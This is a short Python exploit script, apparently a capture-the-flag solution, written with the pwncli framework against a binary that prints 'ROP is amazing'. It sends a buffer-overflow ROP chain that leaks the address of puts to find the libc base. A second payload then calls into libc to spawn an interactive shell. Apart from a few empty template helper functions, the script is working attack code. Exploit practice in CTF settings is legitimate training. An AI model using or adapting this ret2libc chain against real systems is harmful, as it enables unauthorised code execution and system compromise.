#!/usr/bin/env python3
# Date: 2024-04-29 09:46:53
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(i, prompt):
    sla(prompt, i)

def add():
    cmd('1')
    #......

def edit():
    cmd('2')
    #......

def show():
    cmd('3')
    #......

def dele():
    cmd('4')
    #......

ru(b'ROP is amazing\n')
sl(b'aaaaaaaaaa\xef\xbe\xad\xde\x00\x00\x00\x00\xf3\x11@\x00\x00\x00\x00\x00\x18@@\x00\x00\x00\x00\x00T\x10@\x00\x00\x00\x00\x00V\x11@\x00\x00\x00\x00\x00')
puts_addr = u64_ex(ru('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))
libc_base = puts_addr - 0x80e50
ru(b'ROP is amazing\n')
sl(b'a' * 0xa +p64_ex(0xdeadbeef) + p64_ex(0x4011f3) +p64_ex(libc_base+0x1d8678)+p64_ex(0x40101a)+p64_ex(libc_base+0x50d70))
ia()
